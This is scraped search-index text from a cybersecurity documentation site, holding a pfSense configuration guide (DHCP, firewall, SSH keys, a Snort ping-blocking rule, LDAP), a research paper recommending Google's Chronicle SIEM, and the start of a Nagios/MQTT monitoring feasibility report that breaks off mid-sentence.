Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#abstract","content":" In this guide you will be able to set up your own pfsense in a virtual environment. Pfsense is a free to use software that is easy to maintain and most importantly it is secure. This guide will show you how to set up the wizard, configure DHCP, Firewall rules, SSH into your pfsense and IDS/IPS using snort  ","version":"Next","tagName":"h2"},{"title":"1. Setup the wizard​","type":1,"pageTitle":"pFsense Configuration Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#1-setup-the-wizard","content":" When you first enter your pFsense LAN IP address into your browser, you’ll be met with a setup wizard.  If you logged into pFsense and you didn’t get prompt with a setup wizard, click on System -&gt; Setup Wizard and that should start up the setup wizard.  Click on Next twice as they are irrelevant.Step 2 is up to personal preference; you can name your Domain and Hostname to whatever you want. It is recommended to have a familiar and easy to remember name. For primary and secondary DNS, you can put in popular DNS’s such as Google’s DNS 8.8.8.8. Make sure to uncheck override DNS.pFsense NTP Time Server is completely fine, so leave that as is. Then change the Time zone to wherever you are, for me, I am in Melbourne, so I chose Australia/Melbourne as my Time zone.On step 4, configuring WAN, you will want to leave that as is, since our WAN DHCP will give us IP addresses.Step 5 is important as the default LAN IP is a popular IP address. It is recommended to change it; I will change mine to 10.32.30.1, you can change it to whatever you like, I’d recommend keeping it as a private address. Keep the subnet mask as 24.It is highly recommended to change your password to something secure. At least 8 characters in total with upper- and lower-case characters, include numbers and a special character for a secure password.Now your wizard is complete, all you need to do is click Reload.You will notice that you lost access to your pFsense, that is because you changed your LAN IP. Next you will have to release and renew your DHCP. To do this open your CMD and type in the following commands, ipconfig /release -&gt; ipconfig /renew. Then type ipconfig to check if the DHCP has successfully renewed a new IP.Type in your new pFsense LAN IP in your browser and you should be prompted to the login page.  It is important that your pfsense is up to date, to check for any available updates go to: System -&gt; Update. Once you access the update page it will automatically check for any updates. You need to ensure that your pfsense Status states it is up to date  ","version":"Next","tagName":"h3"},{"title":"2. Back-up and Restore​","type":1,"pageTitle":"pFsense Configuration Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#2-back-up-and-restore","content":" When configuring your pfsense you can easily brick or ruin your current configuration. To ensure this doesn’t happen:  click the tab on the top right Diagnostics -&gt; Backup &amp; Restore.Click on the download button for your current configuration as XML and save it locally on your main device that you will access and configure your pfsense.If you come across a critical error on your pfsense, access your XML file in Configuration file option.Then click Restore Configuration. As simple as that, your pfsense is now running correctly.  Note: Make sure you do this before you make big changes and updates to your pfsense.  ","version":"Next","tagName":"h3"},{"title":"3. Configure DHCP​","type":1,"pageTitle":"pFsense Configuration Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#3-configure-dhcp","content":" To access your DHCP configuration access Services -&gt; DHCP Server  Once you access your DHCP settings, you will notice an end-of-life service message, to ensure the stability of your pfsense for the foreseeable future you will want to change to the newer version.  Follow the steps shown in the image above, change to Kea DHCP and make sure you scroll down to the bottom and click Save.  You can change your IP address range, by default it is set to its maximum, that is fine, you can change that if you like.  From there your DHCP is set up and ready to go.  ","version":"Next","tagName":"h3"},{"title":"4. Firewall configuration​","type":1,"pageTitle":"pFsense Configuration Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#4-firewall-configuration","content":" We will configure a firewall rule to allow port 22 for SSH to the VM.  go to Firewall -&gt; Rules -&gt; WAN -&gt; AddKeep action to passSince this will be SSH the protocol will be TCPYou can keep source addresses to any, if you are concerned about security, you can change that to WAN Adress.Destination address will be the This firewall (self), and the destination port ranges will be from 22 to 22In extra options it is recommended to add a description for future reference, I added “Allow SSH”. You can change the description to whatever you like.You can now click on save and apply changes.  ","version":"Next","tagName":"h3"},{"title":"5. SSH into pfsense​","type":1,"pageTitle":"pFsense Configuration Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#5-ssh-into-pfsense","content":" By default, SSH on pfsense is disabled, you can enable by accessing advanced settings.  To do this go to System -&gt; Advanced    Scroll down to SSH section and enable SSH by ticking Enable Secure ShellDue to security concerns make sure SSHd Key is Public Key Only. Keep SSH port at 22.Now you will need to download putty and puttygen.exe, so you will be able to generate a public and private key. You can download from here: download here.It's simple to install, all you need to download is the 64bit MSI installer and scroll down and download puttygen.exe 64bitonce you have downloaded putty Gen, click on generate and move your mouse around the screen to generate a key.You will then want to save the private key on your PC, it is recommended to you a passphrase.Copy the public key that’s in the text box.In your pfsense navigate to System -&gt; User Manager. On the right of your user account you will see Actions pen, click on that.Scroll down to the Keys section and past in your public key in the text box. Make sure you click on Save before exiting.Open Putty and put in your LAN IP address in the session tab and make sure the Connection Type is set as SSH.You will then need to navigate in putty: Connection -&gt; SSH -&gt; Auth -&gt; Credentials to authenticate with -&gt; Then browse and enter your private key file for authentication. You should then be able to connect to your pfsense via SSH by clicking Open  If everything is correct you should be prompted to login into your pfsense username.    once you have downloaded putty Gen, click on generate and move your mouse around the screen to generate a key.You will then want to save the private key on your PC, it is recommended to you a passphrase.Copy the public key that’s in the text box.In your pfsense navigate to System -&gt; User Manager. On the right of your user account you will see Actions pen, click on that.Scroll down to the Keys section and past in your public key in the text box. Make sure you click on Save before exiting.Open Putty and put in your LAN IP address in the session tab and make sure the Connection Type is set as SSH.You will then need to navigate in putty: Connection -&gt; SSH -&gt; Auth -&gt; Credentials to authenticate with -&gt; Then browse and enter your private key file for authentication. You should then be able to connect to your pfsense via SSH by clicking Open  If everything is correct you should be prompted to login into your pfsense username.  Now you should be in an SSH session for your pfsense.  ","version":"Next","tagName":"h3"},{"title":"6. Downloading snort for IDS/IPS​","type":1,"pageTitle":"pFsense Configuration Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#6-downloading-snort-for-idsips","content":" In this section I will show you how to install snort in pfsense and configure a basic snort rule  navigate to System -&gt; Package Manager -&gt; Available Packages and search for “Snort”Select the green install button and click on the confirm button to initialize the install for SnortOnce the installation has been completed, you will be met with a success message. You will now see a new Snort option under the Services drop down box.Once you are in the Snort tab, under Snort Interfaces click on the green add button.This interface will be for the LAN, so change the Interface to LANUnder block settings check the option for Block Offenders, keep all the other settings as default. This is an IPS rule since we are preventing pings.Once all settings have been applied, scroll down to the bottom and click save.Go back to Snort Interfaces under Snort Status, click the blue start button to activate and to the right of your new LAN snort rule, and then click on the Pencil under Actions.    Go to LAN Rules, here we can create simple rules, in this guide I will make an ICMP rule that will be blocking all pings.Enter this rule in the Defined Custom Rules text box: “reject icmp any any -&gt; any any (msg:”ping blocked”;sid:1000001)“ and click save.Open CMD and ping, I chose to ping my LAN IP of 10.32.30.1  As shown in the Blocked tab we have blocked pings by snort after using ping:  ","version":"Next","tagName":"h3"},{"title":"7. Configure LDAP for pfsense​","type":1,"pageTitle":"pFsense Configuration Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration#7-configure-ldap-for-pfsense","content":" Navigate to System -&gt; User Manager -&gt; Authentication Servers, Then click the green Add buttonGive the fully qualified domain name or IP address of your LDAP in this case, it will be “redbackops.org.au”For port value, this will very on your LDAP’s configuration, if it uses TCP by default, you will use port 389. Or if you use the more secure SSL/TLS you will use port 636 by default.Change search scope to Entire Subtree. And add the LDAP server’s domain controller.The authentication containers are used to find account locations inside the LDAP, it’s important to separate them by semicolon.Once the settings have been applied, scroll down and click save. If done correctly, there should not be any errors preventing you from saving.Now check for connectivity with your LDAP, to do that stay in the user manager tab and navigate to settingsSelect your LDAP server in the Authentication Server drop down box. scroll down and select Save &amp; Test, if successful, you should see you have made connection to your LDAP. ","version":"Next","tagName":"h3"},{"title":"Security Information and Event Management Systems","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Security Information and Event Management Systems","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research#introduction","content":" Security Information and Event Management Systems (SIEM) has been widely used as robust tools for detection, prevention, and response against attacks on information security as mentioned by González-Granadillo et al., SIEM solutions have been evolving to meet the demands of advancing technology. The systems are becoming more comprehensive to provide a wide range of visibility for the identification of high-risk areas and focusing on the mitigation strategies aimed at minimizing costs and time taken to respond to attacks. González-Granadillo et al., further states that SIEM systems today are built upon or are integrated with big data analytics and artificial intelligence tools [1].  Redback Operations is looking to invest in more robust and apprehensive SIEM systems to curb the increasing number of cyberattacks that have affected the information technology industry, which has substantially grown over the past years. Additionally, Redback Operations is implementing SIEM systems to operate legally in the industries. According to Miloslavskaya, this is due to the many complicated regulations and compliances that companies must conform to for them to stay operational as [2]. There are many SIEM systems today, however, this research will focus on Google SIEM. This paper will provide comprehensive research on the Google SIEM system. It will discuss the features of the Google SIEM systems, how it is going to be implemented into the GCP of the company, and the benefits the company will gain from implementing google SIEM.  ","version":"Next","tagName":"h2"},{"title":"Google SIEM​","type":1,"pageTitle":"Security Information and Event Management Systems","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research#google-siem","content":" Security Information and Event Management SIEM, is a technology that helps companies with threats detection, prevention, compliance, and security incident management by collecting and analyzing real-time and historical, security events, a wide range of other events, and appropriate data sources. SIEM system works by merging two technologies, Security Information Management (SIM), and Security Event Management (SEM) as suggested by a study [3]. SIM is used for collecting data from files for analyses and reporting security threats and occurrences. On the other hand, SEM works by conducting real-time system monitoring and notifying the network administrator of significant issues, and establishing associations between the security events [3].  A typical SIEM system works by providing real-time visibility across the organization’s information security system, establishing correlations between events gathered from the collected data and the security events, consolidating data from various sources, and automatically notifying the network administrator of any problem in the information security system (Díaz López et al., 2018). Many companies have developed their SIEM software to be used for detecting attacks and irregularities in the information technology system. Some of these companies include HP, IBM, McAfee, until, Google, RSA, Splunk, and many others.  Google's SIEM system is known as Chronicle. It is a software as a service (SaaS) product that is built on the core of Google infrastructure. From certain research [4], Chronicle utilizes data platforms used by Google to power its biggest products to deal with the collection, hunting, correlation, detection, and reporting of on-premises and multi-cloud, security logs. It uses raw and normalized logs by making them available for searching, detecting, and reporting. Additionally, Chronicle works by removing the existing barrier that has been between having a massive amount of data and slow performance, which has enabled its clients to scale and hunt millions of data [4]. Chronicle’s main objective is to deliver a modern threat detection and investigation system with integrated intelligence, using unprecedented speed and scale at a disruptive and affordable price.  Google SIEM system is built to perform analyses on such massive amounts of network and security telemetry that companies generate. It helps to normalize, index, correlates, and analyze data to supply instant analysis and the framework threats, and risks in the organization. The system helps the company to investigate the aggregated security information for a long period. This can be achieved by using the Chronicle search in all the domains that are accessible within the organization. Furthermore, it allows the organization to narrow the search to a specific domain, IP address, or asset to determine if any compromises have occurred.  ","version":"Next","tagName":"h2"},{"title":"Features and Capabilities of Google SIEM​","type":1,"pageTitle":"Security Information and Event Management Systems","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research#features-and-capabilities-of-google-siem","content":" Today’s worst reality in the information technology sector is that no matter how advanced or robust technologies are, companies cannot stop all the cyberattacks presented in the IT environment. Often at times, viruses and malware find a way to infiltrate the networks. Therefore, without detection and prevention measures, the malware may end up residing in the network for months on end. For this reason, it is important to be aware of the features and capabilities of every system implemented in the company. In their paper, Mokalled et al., suggest that this knowledge enables a company to select the most suitable solution that will suit its needs and demands [5]. For the Google SIEM system, the company should look for the following features and capabilities:  Log management: One of the main features of the Google SIEM system is to collect and store data from multiple and heterogeneous sources. As mentioned by Mokalled et al., the data is then consolidated in a central location for Redback Operations’ information security team to access the information easily [6]. Additionally, the log management feature enables the Redback Operations to reformat the data, it receives and makes it more consistent, plus makes the process of analysis much easier. Threat intelligence feeds connections: The SIEM system must be able to stay up to date with threat intelligence, which includes evolution, resolution, and propagation. The system should be able to provide real-time streams of data that provide information on the potential cyberattacks and risks Integrations and APIs: The SIEM system should be able to provide high-performance APIs that will expose the functionality to downstream enterprises and tools. It should also be able to send data directly and smoothly within Redback Operations systems and networks such that members can easily access them. It should also be compatible with various systems within the company to ensure easy integration. Security alerts: The system should keep the security team updated immediately when the system detects a potential threat [6]. Security events correlation: The SIEM system must be able to analyze and evaluate every accumulated data from the log management and investigate for any signs of cyberattack, data, breach, or threat infiltration. Additionally, the system should unify individual security telemetry into one timeline [6]. Machine learning: This is a new feature among SIEM solutions. It is however important for the solution to have a machine learning feature to allow the system to learn from historical events, as well as find indicators automatically, and be able to adapt to new environments without input from the security team. This makes the system more efficient and effective in terms of threat management. Dashboard and reporting: The system should be able to simplify its findings from the intelligence feeds and present them to the security team, or the audience in ways that can be easily understood. This will give the security team an easy time making sense of the data presented by the Google SIEM system.  ","version":"Next","tagName":"h2"},{"title":"Implementing Google SIEM into GCP​","type":1,"pageTitle":"Security Information and Event Management Systems","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research#implementing-google-siem-into-gcp","content":" Many companies today are integrating Google Cloud Platforms (GCP) into their operations due to its stability and numerous built-in services. However, while the GCP security command center serves many purposes, it is limited to GCP-specific sources only. For this reason, it is recommended to implement the SIEM system to enable GCP to aggregate all the data and to ensure compliance within the platform. While many legacy SIEM systems do not support GCP, Google SIEM seamlessly integrates with the GCP. For Redback Operations to integrate GCP with the SIEM, there are two options to choose from. This includes pushing logs to logSentinel SIEM and pulling logs from GCB. Pulling logs is mostly used for on-premise SIEM setups which regularly take place in the background. This method allows Redback Operations to install SIEM locally and avoid exposing their systems to the Internet which is required to receive post loans from the GCP. Below is the illustration of the instructions to implement SIEM to GCP using the pulling logs method    Pushing logs is more flexible, and relies more on the native GCP log router configuration. Below is the illustration of the instructions: to implement SIEM to GCP using the pushing logs method.    ","version":"Next","tagName":"h2"},{"title":"Benefits of Implementing Google SIEM​","type":1,"pageTitle":"Security Information and Event Management Systems","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research#benefits-of-implementing-google-siem","content":" Different organizations use SIEM systems for different purposes. Despite this, the general purpose of having a SIEM system is to ensure Redback Operations has consistent high-quality security and visibility of their network. SIEM is one of the most critical systems in the company. By implementing SIEM, the company will enjoy the following benefits:  Visibility and data aggregation: Despite the size of Redback Operations, the Google SIEM tool will provide real-time and comprehensive visibility across all networks, systems, databases, and applications in the organization. Additionally, given that the company generates massive data from numerous sources, and in various formats, the Google SIEM tool comes in handy to make sense of the data by automatically aggregating and normalizing the data. Not only will Google SIEM collect and store data in a centralized location, but it will also normalize data to uniform formats that can be easily compared to, analyzed, interpreted, and find correlations that will help in detecting and preventing security threats and incidences. Threats and Vulnerabilities detection: Many organizations have suffered data breaches and malware infiltration that have cost them millions, and a damaged reputation. Additionally, cyberattacks have become more advanced and sophisticated in that they are now able to pass through detection systems and reside in the network for an unprecedented amount of time. Having implemented the Google SIEM system will help with collecting and analyzing log data generated by assets within Redback Operations, and can detect incidences that could be otherwise missed if the logs were not analyzed. Analyzing the data logs enables the system to recreate the occurrences that have happened and determine the exact nature of the attack or infiltration, and whether it succeeded or not. Once the infiltration or the threat has been detected, the system will alert the administrator or the IT security team and provide a report on the scope of the attack which will enable them to respond accordingly. Enhanced efficiency: Implementing the Google SIEM tool will significantly improve the efficiency of the security team. Google SIEM tool simplifies and automates most of the security work that could have been handled by the security team. For instance, the system automatically analyses, interprets, finds correlations, and reports on its findings on risks and potential threats to the security of the network. Its reporting feature simplifies data and findings by presenting them in ways that can be easily interpreted by the security team. Additionally, it also has an automated mechanism that uses data correlation and analysis to stop attacks and infiltration as soon as they are detected, or when the attack is still in progress, thus minimizing the impact of the attack. Simplified compliance reporting: According to Caldeira, every organization across all industries, have some regulations and policies they must comply with. It is difficult and time-consuming to ensure compliance with all the regulations, as well as provide evidence that the organization is complying [7]. Google SIEM system comes in handy through its capabilities of collecting, normalizing, and organizing log data which helps to simplify the compliance reporting process. Many compliance reports and customized reports that include all relevant long, security events across the company [7]. Implementing Google SIEM is beneficial to Redback Operations as it provides centralized logging capabilities. Redback Operations will no longer need to manually, retrieve the data from every database, network, system, and application within the IT environment, nor will it be forced to generate individual reports from the individual assets, then assemble them into a single report.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Security Information and Event Management Systems","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research#conclusion","content":" Google SIEM system is a great security tool the company will significantly benefit from. Its objectives of providing real-time visibility across Redback Operations Company, information, and security system, establish relations between events gathered from the collecting data and security events, consolidate data from the resources, and automatically notify the administrator of any problem in the information security system, its robust capabilities, and features, and its numerous benefits, it is recommended that the company implement the Google SIEM system.  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Security Information and Event Management Systems","url":"/redback-documentation/docs/cybersecurity/research/SIEM-research#references","content":" González-Granadillo, G., González-Zarzosa, S., &amp; Diaz, R. (2021). Security Information and Event Management (SIEM): Analysis, Trends, and Usage in Critical Infrastructures. Sensors, 21(14), 4759. https://doi.org/10.3390/s21144759 Miloslavskaya, N. (2017). Analysis of SIEM Systems and Their Usage in Security Operations and Security Intelligence Centers. Advances in Intelligent Systems and Computing, 282–288. https://doi.org/10.1007/978-3-319-63940-6_40 Díaz López, D., Blanco Uribe, M., Santiago Cely, C., Vega Torres, A., Moreno Guataquira, N., Morón Castro, S., Nespoli, P., &amp; Gómez Mármol, F. (2018). Shielding IoT against Cyber-Attacks: An Event-Based Approach Using SIEM. Wireless Communications and Mobile Computing, 2018, 1–18. https://doi.org/10.1155/2018/3029638 Uehara, M. (2021). Zero Trust Security in the Mist Architecture. Complex, Intelligent and Software Intensive Systems, 278, 185–194. https://doi.org/10.1007/978-3-030-79725-6_18 Mokalled, H., Catelli, R., Casola, V., Debertol, D., Meda, E., &amp; Zunino, R. (2019). The Applicability of a SIEM Solution: Requirements and Evaluation. 2019 IEEE 28th International Conference on Enabling Technologies: Infrastructure for Collaborative Enterprises (WETICE). https://doi.org/10.1109/wetice.2019.00036 Mokalled, H., Catelli, R., Casola, V., Debertol, D., Meda, E., &amp; Zunino, R. (2020). The Guidelines to Adopt an Applicable SIEM Solution. Journal of Information Security, 11(01), 46–70. https://doi.org/10.4236/jis.2020.111003 Caldeira, H. (2021). Security Information and Event Management (SIEM) Implementation Recommendations to Enhance Network Security - ProQuest. Www.proquest.com. https://www.proquest.com/openview/9e4526ef3c8c179fc9128f72132a9eee/1?pq-origsite=gscholar&amp;cbl=18750&amp;diss=y ","version":"Next","tagName":"h2"},{"title":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report","content":"","keywords":"","version":"Next"},{"title":"Objective​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#objective","content":" To assess the feasibility and identify gaps in implementing Nagios for monitoring a network comprising IoT devices connected via an MQTT server.  ","version":"Next","tagName":"h2"},{"title":"1. Current Network and Infrastructure Analysis​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#1-current-network-and-infrastructure-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Network Topology​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#network-topology","content":" Number of IoT devices: List of IoT Devices from the Report: Accelerometer Sensors: Integrated for movement tracking in player tracking systems.Gyroscope Sensors: Used alongside accelerometers for enhanced motion detection.Arduino Nano 33 IoT: Platform utilized for tracking player movements and integrating various sensors.Raspberry Pi: Employed for processing and managing IoT applications.Health Monitoring Sensors: Designed for elderly care, focusing on vital sign tracking and fall detection.Wearable Tech Sensors: General category for devices aimed at monitoring health and athletic performance. Network layout and segmentation: Segmented Network Architecture: The network is divided into distinct segments to enhance security and performance, isolating IoT devices from other network components. Device Grouping: IoT devices are grouped based on functionality, such as health monitoring, data analytics, and user interaction, allowing for targeted management and monitoring. Integration Points: Existing monitoring tools are integrated at various points within the network to ensure real-time data collection and analysis, facilitating efficient communication between devices and systems.  ","version":"Next","tagName":"h3"},{"title":"Existing Monitoring Tools and Their Integration Points​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#existing-monitoring-tools-and-their-integration-points","content":" Wazuh: Integration Point: Monitors security events and logs from IoT devices, providing alerts and insights into potential threats. Suricata: Integration Point: Functions as an Intrusion Detection System (IDS) to analyze network traffic and detect anomalies related to IoT device communications. PowerBI: Integration Point: Visualizes data collected from IoT devices and incident reports, providing dashboards for real-time monitoring and analysis. MQTT Server: Integration Point: Facilitates communication between IoT devices and the data management system, ensuring efficient data logging and transmission. Docker Instances: Integration Point: Hosts various applications and tools for data processing and analysis, enhancing the overall monitoring capabilities of the network.  ","version":"Next","tagName":"h3"},{"title":"MQTT Server Details​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#mqtt-server-details","content":" MQTT Broker: The report mentions the use of a secure MQTT cloud server, specifically HiveMQ for data transmission. MQTT Topic Structure and Hierarchy: Topics are organized in a hierarchical structure, allowing for specific subscriptions to various data streams, such as &quot;Bike 1&quot; topics for testing. Quality of Service (QoS) Levels: The report does not specify the exact QoS levels used, but typically, MQTT supports three levels: 0 (At most once), 1 (At least once), and 2 (Exactly once). Security Measures: Security is enhanced through the use of TLS for encrypted data transmission and the implementation of authentication mechanisms, including usernames and passwords for MQTT connections.  ","version":"Next","tagName":"h3"},{"title":"2. Nagios Capabilities and Requirements​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#2-nagios-capabilities-and-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"Core Features​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#core-features","content":" Host and Service Monitoring: Hosts: Nagios can monitor the status of various hosts such as servers, switches, routers, and IoT devices, checking their availability and performance.Services: It can monitor a wide range of network services like HTTP, FTP, SMTP, and more, ensuring these services are running smoothly and without interruptions. Network Protocol Monitoring: HTTP: Monitors web servers, checking for response times, status codes, and ensuring the content is served correctly.FTP: Ensures FTP servers are up and running, monitoring file transfer times and server responses.SMTP: Monitors mail servers to ensure they are sending and receiving emails correctly, checking server response times and error rates. Resource Usage Monitoring: CPU Usage: Tracks CPU load and usage, alerting when usage exceeds predefined thresholds.Memory Usage: Monitors RAM usage, helping to identify memory leaks or applications consuming excessive memory.Disk Usage: Keeps track of disk space, alerting when available space drops below set limits, helping prevent outages due to full disks. Alerting and Notifications: Email Notifications: Sends alerts via email to notify administrators of issues.SMS Notifications: Sends text messages for critical alerts.Custom Scripts: Executes custom notification scripts for more complex alerting needs.Escalation Policies: Defines escalation policies to notify different personnel based on the severity and duration of an issue.  ","version":"Next","tagName":"h3"},{"title":"Nagios Plugins​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#nagios-plugins","content":" ","version":"Next","tagName":"h3"},{"title":"check-mqtt​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#check-mqtt","content":" A Nagios/Icinga plugin for checking connectivity to an MQTT broker. Or with --readonly monitor an MQTT application. Or for checking the status of MQTT clients maintaining the status on an MQTT broker.  This plugin connects to the specified broker and subscribes to a topic. Upon successful subscription, a message is published to said topic, and the plugin expects to receive that payload within max_wait seconds.  Custom Plugins for MQTT: MQTT Monitoring: Custom plugins can be developed or existing ones configured to monitor MQTT brokers, ensuring they are running correctly and handling message traffic efficiently.Topic Monitoring: Plugins can monitor specific MQTT topics, checking message rates and payload content to ensure data integrity and timely delivery. Plugins for IoT Devices: Device Status Monitoring: Plugins to monitor the status and health of IoT devices, ensuring they are online and functioning as expected.Sensor Data Monitoring: Plugins to check sensor readings from devices, ensuring data is within expected ranges and identifying potential issues early.Custom Integrations: Development of custom plugins to interface with specific IoT devices, enabling tailored monitoring solutions. Compatibility with Existing Infrastructure: Wazuh Integration: Plugins to forward Nagios alerts to Wazuh for a centralized security event management solution.Suricata Integration: Ensuring compatibility with Suricata for enhanced network traffic analysis.PowerBI Integration: Potential for plugins that format and forward Nagios data to PowerBI for advanced data visualization.  ","version":"Next","tagName":"h2"},{"title":"System Requirements​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#system-requirements","content":" Supported Operating Systems: Linux Distributions: Nagios is compatible with various Linux distributions such as Ubuntu, CentOS, Debian, and Red Hat Enterprise Linux (RHEL). Hardware Requirements: CPU: Minimum of a dual-core CPU, though more powerful CPUs are recommended for larger installations.Memory: At least 1 GB of RAM, though 2 GB or more is recommended for larger environments with numerous monitored hosts and services.Storage: A minimum of 20 GB of disk space, with additional space needed for storing logs and performance data. Software Dependencies: Web Server: Nagios requires a web server such as Apache or Nginx for its web interface.Database: While not mandatory, using a database such as MySQL or PostgreSQL can enhance performance and data handling.Libraries and Packages: Dependencies include common libraries such as GCC, GD library, and development tools for compiling plugins and additional features.  ","version":"Next","tagName":"h3"},{"title":"3. Compatibility and Integration​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#3-compatibility-and-integration","content":" ","version":"Next","tagName":"h2"},{"title":"IoT Device Integration​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#iot-device-integration","content":" Method for Monitoring: REST APIs: Many IoT devices expose REST APIs for status and data retrieval. Nagios can use these APIs to fetch data periodically. Custom scripts can be developed to interact with these APIs, retrieve necessary metrics, and feed them into Nagios for monitoring and alerting. Custom Scripts: Scripts can be tailored to query specific endpoints or devices, parse the responses, and provide formatted data to Nagios. These scripts can be scheduled via cron jobs or integrated directly into Nagios checks to run at specified intervals. Frequency of Data Collection: Timely Updates: The data collection frequency depends on the criticality of the monitored metrics. High-priority data (e.g., device health) might be collected every minute, whereas less critical data (e.g., temperature) could be collected less frequently. Configurable intervals in Nagios allow for setting the optimal frequency for each check, balancing network load and data freshness. Data Points to be Monitored: Temperature: Monitors temperature readings to ensure devices operate within safe limits, preventing overheating.Humidity: Tracks humidity levels to maintain optimal environmental conditions for devices.Device Status: Checks the operational status (online/offline) of devices, providing immediate alerts if any device becomes unresponsive.Performance Metrics: Additional data points like battery level, signal strength, and sensor-specific metrics to ensure comprehensive monitoring.  ","version":"Next","tagName":"h3"},{"title":"MQTT Integration​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#mqtt-integration","content":" Monitoring MQTT Broker Health: Uptime: Ensures the MQTT broker is continuously running without unexpected downtimes.Active Connections: Monitors the number of active connections to the broker, detecting anomalies or connection spikes that could indicate issues.Message Rates: Tracks the rate of messages being published and subscribed to, ensuring the broker handles the expected load efficiently. Monitoring MQTT Topics and Payloads: Topic Tracking: Monitors specific MQTT topics for message flow, ensuring data is published and subscribed to as expected.Payload Analysis: Inspects message payloads to validate data integrity and correctness, identifying potential issues or data anomalies. Handling of MQTT QoS and Retained Messages: QoS Levels: Manages different QoS levels (0, 1, 2) to ensure reliable message delivery based on the application's requirements.Retained Messages: Handles retained messages to provide persistent data availability, ensuring new subscribers receive the latest message on a topic.  ","version":"Next","tagName":"h3"},{"title":"Security Considerations​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#security-considerations","content":" Secure Communication: Encryption: Uses TLS to encrypt data in transit between Nagios and IoT devices or the MQTT broker, preventing eavesdropping and data tampering.Certificate Management: Implements proper certificate management for establishing secure connections, ensuring certificates are valid and up to date. Access Controls and Authentication: Role-Based Access Control (RBAC): Implements RBAC to restrict access to Nagios dashboards and configurations based on user roles, ensuring only authorized personnel can make changes. Authentication Mechanisms: Uses strong authentication methods, such as username/password combinations, API tokens, or OAuth, to control access to the monitoring system and IoT device APIs. Compliance with Security Policies: Policy Adherence: Ensures all monitoring practices comply with organizational security policies and standards, such as ISO 27001 or NIST.Data Integrity and Confidentiality: Implements measures to maintain the integrity and confidentiality of monitored data, including encryption, access controls, and regular security audits.Incident Response: Defines procedures for responding to security incidents detected by Nagios, ensuring timely and effective remediation.  ","version":"Next","tagName":"h3"},{"title":"4. Implementation Steps​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#4-implementation-steps","content":" ","version":"Next","tagName":"h2"},{"title":"Preparation​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#preparation","content":" Set Up a Test Environment: Mirroring Production Setup: Create a test environment that closely resembles the production network, including IoT devices, MQTT broker, and existing monitoring tools. Use virtual machines or physical hardware to replicate the network topology and segmentations. Install Nagios: Choose a 